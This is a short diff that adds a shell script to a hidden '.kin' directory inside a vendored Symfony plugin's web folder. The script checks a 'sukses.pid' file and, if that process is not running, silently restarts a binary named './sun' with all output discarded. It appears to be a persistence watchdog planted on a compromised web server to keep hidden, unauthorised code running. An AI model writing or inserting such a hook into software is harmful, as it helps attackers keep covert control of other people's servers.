@@ -1,0 +1,10 @@
+#!/bin/sh
+if test -r /home/rayku/lib/vendor/symfony1.2/lib/plugins/sfProtoculousPlugin/web/.kin/sukses.pid; then
+pid=$(cat /home/rayku/lib/vendor/symfony1.2/lib/plugins/sfProtoculousPlugin/web/.kin/sukses.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd /home/rayku/lib/vendor/symfony1.2/lib/plugins/sfProtoculousPlugin/web/.kin
+./sun &>/dev/null
